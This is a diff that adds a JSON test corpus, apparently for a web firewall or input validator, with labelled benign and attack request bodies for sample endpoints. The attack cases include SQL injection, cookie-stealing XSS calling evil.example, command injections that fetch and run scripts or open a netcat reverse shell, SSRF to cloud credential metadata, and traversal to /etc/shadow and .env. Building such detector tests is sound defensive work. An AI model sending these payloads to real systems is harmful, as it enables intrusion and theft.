@@ -1,0 +1,1220 @@
+{
+  "endpoints": {
+    "POST /userLogin": {
+      "declared": {
+        "login": "string",
+        "password": "string"
+      }
+    },
+    "POST /userRegister": {
+      "declared": {
+        "login": "string",
+        "password": "string",
+        "email": "string"
+      }
+    },
+    "POST /comments": {
+      "declared": {
+        "text": "string"
+      }
+    },
+    "POST /search": {
+      "declared": {
+        "q": "string"
+      }
+    },
+    "PATCH /profile": {
+      "declared": {
+        "bio": "string",
+        "displayName": "string",
+        "website": "url"
+      },
+      "extraTools": {
+        "website": [
+          "url_validator"
+        ]
+      }
+    },
+    "POST /webhooks": {
+      "declared": {
+        "url": "url"
+      },
+      "extraTools": {
+        "url": [
+          "url_validator"
+        ]
+      }
+    },
+    "POST /diagnostics/ping": {
+      "declared": {
+        "host": "string"
+      }
+    },
+    "POST /files/read": {
+      "declared": {
+        "path": "string"
+      }
+    },
+    "POST /snippets": {
+      "declared": {
+        "title": "string",
+        "code": "string"
+      }
+    },
+    "POST /reports": {
+      "declared": {
+        "title": "string",
+        "description": "string"
+      }
+    },
+    "POST /cart": {
+      "declared": {
+        "quantity": "integer",
+        "couponCode": "string"
+      },
+      "extraTools": {
+        "quantity": [
+          "integer_range"
+        ]
+      }
+    },
+    "POST /upload": {
+      "declared": {
+        "description": "string"
+      },
+      "fileTools": [
+        "file_size",
+        "mime_type",
+        "archive_expansion_ratio"
+      ]
+    },
+    "PATCH /admin/users/42": {
+      "declared": {
+        "name": "string"
+      }
+    }
+  },
+  "cases": [
+    {
+      "name": "keyword login union select",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "two SQL words as a login",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "Union Select",
+        "password": "anything"
+      }
+    },
+    {
+      "name": "keyword username drop table",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "SQL words as a registration name",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "Drop Table",
+        "password": "hunter2hunter2",
+        "email": "dt@example.com"
+      }
+    },
+    {
+      "name": "sql question in comment",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "asking about UNION vs UNION ALL in prose",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Should I use UNION or UNION ALL to select from two tables?"
+      }
+    },
+    {
+      "name": "stacked-looking bio",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "semicolon followed by a SQL verb inside a sentence",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "Engineer; delete bugs, update docs"
+      }
+    },
+    {
+      "name": "math puzzle search",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "'or 2=2' inside a puzzle search",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "best 2 or 2=2 math puzzle"
+      }
+    },
+    {
+      "name": "shell talk in comment",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "describes shell commands in prose",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "I run rm -rf /tmp/cache; cat notes.txt every day, is that bad?"
+      }
+    },
+    {
+      "name": "backticks in comment",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "markdown inline code with a command",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Press ctrl+c then run `ls -la` to see the files"
+      }
+    },
+    {
+      "name": "password with quote-dash",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "a password that ends a quote followed by dashes",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "P@ss;w0rd'--!"
+      }
+    },
+    {
+      "name": "select all in search",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "shopper searching for SELECT brand items",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "select all items from the union square store"
+      }
+    },
+    {
+      "name": "hash comment bio",
+      "label": "benign",
+      "category": "benign/keywords",
+      "why": "a quote followed by a # in a hashtag bio",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "Dad of 'two' #blessed #golang"
+      }
+    },
+    {
+      "name": "quoted dash bio",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "single-quoted word then a dash",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "He said 'hello' -- and left"
+      }
+    },
+    {
+      "name": "cpp templates search",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "angle brackets in a C++ search",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "C++ templates <typename T> tutorial"
+      }
+    },
+    {
+      "name": "inequalities comment",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "comparison operators in prose",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "5 > 3 and 2 < 4 so a<b>c holds"
+      }
+    },
+    {
+      "name": "symbol soup password",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "a random password using every symbol",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "!@#$%^&*()_+-=[]{}|;:'\",.<>/?`~"
+      }
+    },
+    {
+      "name": "crlf in comment body",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "multi-line text with CRLF in a body field",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Line one\r\nLine two\r\n\r\nThanks"
+      }
+    },
+    {
+      "name": "json in a sentence",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "describes mongo operators in prose",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "{\"op\": \"$ne\", \"value\": null} is how mongo operators look"
+      }
+    },
+    {
+      "name": "base64 bio",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "base64 blob in a bio",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "aGVsbG8gd29ybGQ="
+      }
+    },
+    {
+      "name": "url-encoded utf8 search",
+      "label": "benign",
+      "category": "benign/punctuation",
+      "why": "percent-encoded accents in a query value",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "caf%C3%A9 menu"
+      }
+    },
+    {
+      "name": "snippet innerhtml",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "DOM code is the product on a snippets endpoint",
+      "endpoint": "POST /snippets",
+      "body": {
+        "title": "set html",
+        "code": "document.querySelector('#x').innerHTML = '<b>hi</b>';"
+      }
+    },
+    {
+      "name": "snippet union select",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "SQL tutorial snippet",
+      "endpoint": "POST /snippets",
+      "body": {
+        "title": "union example",
+        "code": "SELECT name FROM users WHERE id = 1 UNION SELECT name FROM admins;"
+      }
+    },
+    {
+      "name": "snippet html script",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "an HTML example with a script tag, on a snippet endpoint",
+      "endpoint": "POST /snippets",
+      "body": {
+        "title": "hello page",
+        "code": "<script>console.log('hello')</script>"
+      }
+    },
+    {
+      "name": "snippet shell",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "a shell script as a snippet",
+      "endpoint": "POST /snippets",
+      "body": {
+        "title": "cleanup",
+        "code": "for f in *.tmp; do rm -f \"$f\"; done; echo done"
+      }
+    },
+    {
+      "name": "rich text comment",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "allowed formatting tags",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "<b>bold</b> and <i>italic</i> <a href=\"https://example.com\">link</a>"
+      }
+    },
+    {
+      "name": "bug report with poc payload",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "a security report quoting a payload it found",
+      "endpoint": "POST /reports",
+      "body": {
+        "title": "Reflected XSS in /search",
+        "description": "PoC: <img src=x onerror=alert(1)> is reflected in the q parameter without encoding."
+      }
+    },
+    {
+      "name": "report with sqlmap command",
+      "label": "benign",
+      "category": "benign/code-and-markup",
+      "why": "a report quoting an exploit command and payload",
+      "endpoint": "POST /reports",
+      "body": {
+        "title": "SQL injection in /items",
+        "description": "Reproduced with sqlmap -u 'http://x/?id=1' --dbs ; the payload ' OR 1=1-- also works."
+      }
+    },
+    {
+      "name": "parameterized query advice",
+      "label": "benign",
+      "category": "benign/security-discussion",
+      "why": "educational text quoting a classic payload",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Never concatenate user input; use parameterized queries instead of ' OR '1'='1"
+      }
+    },
+    {
+      "name": "alert domain example",
+      "label": "benign",
+      "category": "benign/security-discussion",
+      "why": "mentions a well-known XSS test string",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "The classic alert(document.domain) example shows the origin"
+      }
+    },
+    {
+      "name": "log4shell explainer",
+      "label": "benign",
+      "category": "benign/security-discussion",
+      "why": "explains Log4Shell with the lookup syntax",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "CVE-2021-44228 is Log4Shell: attackers send ${jndi:ldap://host/a} strings that get logged"
+      }
+    },
+    {
+      "name": "path traversal explainer",
+      "label": "benign",
+      "category": "benign/security-discussion",
+      "why": "documentation text about ../ and /etc/passwd",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Path traversal means sending ../../etc/passwd to read files outside the web root"
+      }
+    },
+    {
+      "name": "cjk login",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "CJK name",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "山田太郎",
+        "password": "hunter2hunter2",
+        "email": "yt@example.jp"
+      }
+    },
+    {
+      "name": "rtl bio",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "Arabic and emoji bio",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "مرحبا 🚀 hello"
+      }
+    },
+    {
+      "name": "accented name",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "diacritics in a name",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "Zoë Müller",
+        "password": "correct horse battery",
+        "email": "zm@example.com"
+      }
+    },
+    {
+      "name": "polish name",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "diacritics and an apostrophe-free name",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "displayName": "Łukasz Żółć"
+      }
+    },
+    {
+      "name": "apostrophe surname",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "an apostrophe in a surname",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "O'Brien",
+        "password": "secret123secret",
+        "email": "ob@example.com"
+      }
+    },
+    {
+      "name": "name with sql hint",
+      "label": "benign",
+      "category": "benign/international",
+      "why": "a surname that is also a SQL keyword",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "Anna Select",
+        "password": "secret123secret",
+        "email": "as@example.com"
+      }
+    },
+    {
+      "name": "plain registration",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "ordinary registration",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "jan.kowalski",
+        "password": "test123test123",
+        "email": "jan@example.com"
+      }
+    },
+    {
+      "name": "plain login",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "ordinary login",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "correct horse battery staple"
+      }
+    },
+    {
+      "name": "plain search",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "ordinary search",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "red running shoes"
+      }
+    },
+    {
+      "name": "plain comment",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "ordinary comment",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Great article, thanks!"
+      }
+    },
+    {
+      "name": "plain webhook",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "public https webhook",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "https://hooks.example.com/notify"
+      }
+    },
+    {
+      "name": "plain ping",
+      "label": "benign",
+      "category": "benign/plain",
+      "why": "public hostname to ping",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "example.com"
+      }
+    },
+    {
+      "name": "legit quick retry",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "same request sent twice quickly (retry)",
+      "endpoint": "POST /cart",
+      "body": {
+        "quantity": 3,
+        "couponCode": "SPRING25"
+      },
+      "repeat": 2
+    },
+    {
+      "name": "valid png upload",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "png with matching magic bytes",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "my avatar"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "avatar.png",
+          "contentType": "image/png",
+          "size": 200000,
+          "magicBytes": "89504e470d0a1a0a0000000d"
+        }
+      ]
+    },
+    {
+      "name": "valid large pdf upload",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "900 KB pdf with matching magic bytes, just under the request size limit",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "contract"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "contract.pdf",
+          "contentType": "application/pdf",
+          "size": 900000,
+          "magicBytes": "255044462d312e37"
+        }
+      ]
+    },
+    {
+      "name": "valid text upload",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "plain text upload",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "notes"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "notes.txt",
+          "contentType": "text/plain; charset=utf-8",
+          "size": 1200
+        }
+      ]
+    },
+    {
+      "name": "quantity as query string",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "an integer sent as a string in the query",
+      "endpoint": "POST /cart",
+      "body": {
+        "couponCode": "SPRING25"
+      },
+      "query": {
+        "quantity": "5"
+      }
+    },
+    {
+      "name": "internal user plain login",
+      "label": "benign",
+      "category": "benign/traffic-and-files",
+      "why": "ordinary login from a private address",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "correct horse battery staple"
+      },
+      "clientIp": "192.168.1.20"
+    },
+    {
+      "name": "localhost lookalike webhook",
+      "label": "benign",
+      "category": "benign/borderline",
+      "why": "public domain whose name contains 'localhost'",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "https://localhost.example.com/hook"
+      }
+    },
+    {
+      "name": "slack webhook",
+      "label": "benign",
+      "category": "benign/borderline",
+      "why": "real-looking slack incoming webhook",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "https://hooks.slack.com/services/T0000/B0000/XXXXXXXX"
+      }
+    },
+    {
+      "name": "security quiz answer",
+      "label": "benign",
+      "category": "benign/borderline",
+      "why": "a training quiz answer containing a payload",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "Answer 3: the payload <script>alert(1)</script> is stored XSS"
+      }
+    },
+    {
+      "name": "sqli quoted tautology",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "classic login bypass",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "admin' OR '1'='1",
+        "password": "x"
+      }
+    },
+    {
+      "name": "sqli comment bypass",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "quote then comment",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "admin'--",
+        "password": "x"
+      }
+    },
+    {
+      "name": "sqli union exfil",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "union with columns and a table",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "' UNION SELECT username, password FROM users--"
+      }
+    },
+    {
+      "name": "sqli time based",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "sleep-based blind injection",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "1' AND SLEEP(5)--"
+      }
+    },
+    {
+      "name": "sqli stacked drop",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "stacked destructive statement",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "x'; DROP TABLE users;--"
+      }
+    },
+    {
+      "name": "sqli comment-obfuscated union",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "UNION/**/ALL/**/SELECT evades keyword adjacency",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "-1 UNION/**/ALL/**/SELECT/**/NULL,@@version,3--"
+      }
+    },
+    {
+      "name": "sqli double encoded",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "double-percent-encoded quote and OR",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "admin%2527%2520OR%25201%253D1--",
+        "password": "x"
+      }
+    },
+    {
+      "name": "sqli boolean blind",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "substring probe with no quote",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'"
+      }
+    },
+    {
+      "name": "sqli xp_cmdshell",
+      "label": "attack",
+      "category": "attack/sqli",
+      "why": "stacked exec of xp_cmdshell",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "1; EXEC xp_cmdshell('whoami')--"
+      }
+    },
+    {
+      "name": "xss script tag",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "script tag in a login field",
+      "endpoint": "POST /userRegister",
+      "body": {
+        "login": "<script>alert(document.domain)</script>",
+        "password": "test123test123",
+        "email": "a@example.com"
+      }
+    },
+    {
+      "name": "xss img onerror exfil",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "onerror exfiltrating cookies",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "<img src=x onerror=fetch('//evil.example/'+document.cookie)>"
+      }
+    },
+    {
+      "name": "xss svg onload",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "svg onload",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "<svg/onload=alert(1)>"
+      }
+    },
+    {
+      "name": "xss attribute breakout",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "closes an attribute then a script",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "\"><script>alert(1)</script>"
+      }
+    },
+    {
+      "name": "xss entity-evaded js uri",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "javascript: with a tab entity",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": "<a href=\"jav&#x09;ascript:alert(1)\">click</a>"
+      }
+    },
+    {
+      "name": "xss js-context breakout",
+      "label": "attack",
+      "category": "attack/xss",
+      "why": "no tags: breaks out of a JS string",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "displayName": "'-alert(1)-'"
+      }
+    },
+    {
+      "name": "cmdi semicolon passwd",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "chained cat /etc/passwd",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "8.8.8.8; cat /etc/passwd"
+      }
+    },
+    {
+      "name": "cmdi substitution",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "command substitution downloading a script",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "$(curl evil.example/x.sh|sh)"
+      }
+    },
+    {
+      "name": "cmdi encoded newline",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "url-encoded newline then id",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "8.8.8.8%0Aid"
+      }
+    },
+    {
+      "name": "cmdi and wget",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "&& wget a payload",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "127.0.0.1 && wget http://evil.example/shell -O /tmp/s"
+      }
+    },
+    {
+      "name": "cmdi reverse shell",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "pipe to netcat reverse shell",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "8.8.8.8|nc -e /bin/sh 203.0.113.9 4444"
+      }
+    },
+    {
+      "name": "cmdi backtick id",
+      "label": "attack",
+      "category": "attack/command-injection",
+      "why": "backtick substitution without spaces",
+      "endpoint": "POST /diagnostics/ping",
+      "body": {
+        "host": "8.8.8.8`id`"
+      }
+    },
+    {
+      "name": "traversal plain",
+      "label": "attack",
+      "category": "attack/path-traversal",
+      "why": "../ up to /etc/passwd",
+      "endpoint": "POST /files/read",
+      "body": {
+        "path": "../../../../etc/passwd"
+      }
+    },
+    {
+      "name": "traversal encoded slashes",
+      "label": "attack",
+      "category": "attack/path-traversal",
+      "why": "%2f-encoded traversal",
+      "endpoint": "POST /files/read",
+      "body": {
+        "path": "..%2f..%2f..%2fetc%2fshadow"
+      }
+    },
+    {
+      "name": "traversal nested dots",
+      "label": "attack",
+      "category": "attack/path-traversal",
+      "why": "....// filter bypass reaching .env",
+      "endpoint": "POST /files/read",
+      "body": {
+        "path": "....//....//....//app/.env"
+      }
+    },
+    {
+      "name": "traversal windows",
+      "label": "attack",
+      "category": "attack/path-traversal",
+      "why": "backslash traversal to win.ini",
+      "endpoint": "POST /files/read",
+      "body": {
+        "path": "..\\..\\..\\windows\\win.ini"
+      }
+    },
+    {
+      "name": "ssrf cloud metadata",
+      "label": "attack",
+      "category": "attack/ssrf",
+      "why": "AWS metadata credentials",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      }
+    },
+    {
+      "name": "ssrf decimal ip",
+      "label": "attack",
+      "category": "attack/ssrf",
+      "why": "loopback as a decimal integer",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "http://2130706433/admin"
+      }
+    },
+    {
+      "name": "ssrf ipv6 mapped",
+      "label": "attack",
+      "category": "attack/ssrf",
+      "why": "IPv4-mapped IPv6 loopback",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "http://[::ffff:127.0.0.1]/admin"
+      }
+    },
+    {
+      "name": "ssrf nip.io",
+      "label": "attack",
+      "category": "attack/ssrf",
+      "why": "wildcard DNS resolving to loopback",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "http://127.0.0.1.nip.io/admin"
+      }
+    },
+    {
+      "name": "ssrf gopher redis",
+      "label": "attack",
+      "category": "attack/ssrf",
+      "why": "gopher scheme to redis",
+      "endpoint": "POST /webhooks",
+      "body": {
+        "url": "gopher://127.0.0.1:6379/_FLUSHALL"
+      }
+    },
+    {
+      "name": "nosql ne operator",
+      "label": "attack",
+      "category": "attack/other-injection",
+      "why": "mongo $ne login bypass",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": {
+          "$ne": null
+        },
+        "password": {
+          "$ne": null
+        }
+      }
+    },
+    {
+      "name": "ssti expression",
+      "label": "attack",
+      "category": "attack/other-injection",
+      "why": "template expression probes",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "{{7*7}}${7*7}<%= 7*7 %>"
+      }
+    },
+    {
+      "name": "ldap injection",
+      "label": "attack",
+      "category": "attack/other-injection",
+      "why": "ldap filter breakout",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "*)(uid=*))(|(uid=*",
+        "password": "x"
+      }
+    },
+    {
+      "name": "xxe doctype",
+      "label": "attack",
+      "category": "attack/other-injection",
+      "why": "external entity reading a file",
+      "endpoint": "POST /reports",
+      "body": {
+        "title": "xml import",
+        "description": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+      }
+    },
+    {
+      "name": "jndi lookup",
+      "label": "attack",
+      "category": "attack/other-injection",
+      "why": "log4shell lookup in a search",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "${jndi:ldap://evil.example/a}"
+      }
+    },
+    {
+      "name": "prototype pollution",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "__proto__ in a json body",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "__proto__": {
+          "isAdmin": true
+        },
+        "bio": "hi"
+      }
+    },
+    {
+      "name": "mass assignment role",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "role escalation fields on profile update",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "bio": "hi",
+        "role": "admin",
+        "isAdmin": true
+      }
+    },
+    {
+      "name": "csv formula",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "spreadsheet formula injection",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "displayName": "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")"
+      }
+    },
+    {
+      "name": "open redirect",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "protocol-relative redirect target",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "x"
+      },
+      "query": {
+        "next": "//evil.example/login"
+      }
+    },
+    {
+      "name": "crlf header injection",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "encoded CRLF setting a cookie via query",
+      "endpoint": "POST /search",
+      "body": {
+        "q": "x"
+      },
+      "query": {
+        "lang": "en%0d%0aSet-Cookie:%20session=attacker"
+      }
+    },
+    {
+      "name": "type confusion quantity",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "a SQL string where the policy declares an integer",
+      "endpoint": "POST /cart",
+      "body": {
+        "quantity": "1; DROP TABLE orders",
+        "couponCode": "SPRING25"
+      }
+    },
+    {
+      "name": "negative cart quantity",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "business-logic abuse: quantity outside the allowed range",
+      "endpoint": "POST /cart",
+      "body": {
+        "quantity": -5000,
+        "couponCode": "SPRING25"
+      }
+    },
+    {
+      "name": "javascript uri website",
+      "label": "attack",
+      "category": "attack/logic-and-headers",
+      "why": "javascript: scheme in a url field",
+      "endpoint": "PATCH /profile",
+      "body": {
+        "website": "javascript:alert(document.cookie)"
+      }
+    },
+    {
+      "name": "exe disguised as png",
+      "label": "attack",
+      "category": "attack/files-and-resources",
+      "why": "PE header under an image content type",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "avatar"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "avatar.png",
+          "contentType": "image/png",
+          "size": 90000,
+          "magicBytes": "4d5a9000030000000400"
+        }
+      ]
+    },
+    {
+      "name": "zip bomb",
+      "label": "attack",
+      "category": "attack/files-and-resources",
+      "why": "tiny archive expanding to 4 GB",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "data"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "data.txt",
+          "contentType": "text/plain",
+          "size": 40000,
+          "magicBytes": "504b0304",
+          "metadata": {
+            "uncompressedSize": 4294967296,
+            "entryCount": 50000
+          }
+        }
+      ]
+    },
+    {
+      "name": "null byte extension",
+      "label": "attack",
+      "category": "attack/files-and-resources",
+      "why": "null byte hiding the real extension",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "report.pdf\u0000.exe"
+      }
+    },
+    {
+      "name": "oversized request body",
+      "label": "attack",
+      "category": "attack/files-and-resources",
+      "why": "1.3 MB comment",
+      "endpoint": "POST /comments",
+      "body": {
+        "text": {
+          "$repeat": [
+            "A",
+            1300000
+          ]
+        }
+      }
+    },
+    {
+      "name": "oversized upload",
+      "label": "attack",
+      "category": "attack/files-and-resources",
+      "why": "8 MB png over the 5 MiB limit",
+      "endpoint": "POST /upload",
+      "body": {
+        "description": "photo"
+      },
+      "files": [
+        {
+          "field": "document",
+          "filename": "photo.png",
+          "contentType": "image/png",
+          "size": 8000000,
+          "magicBytes": "89504e470d0a1a0a"
+        }
+      ]
+    },
+    {
+      "name": "credential stuffing burst",
+      "label": "attack",
+      "category": "attack/traffic",
+      "why": "101 login attempts in a minute from one address",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "anna",
+        "password": "Summer2024!"
+      },
+      "repeat": 101
+    },
+    {
+      "name": "sqli from private address",
+      "label": "attack",
+      "category": "attack/traffic",
+      "why": "login bypass sent from an internal address",
+      "endpoint": "POST /userLogin",
+      "body": {
+        "login": "admin' OR '1'='1",
+        "password": "x"
+      },
+      "clientIp": "172.16.0.9"
+    }
+  ]
+}
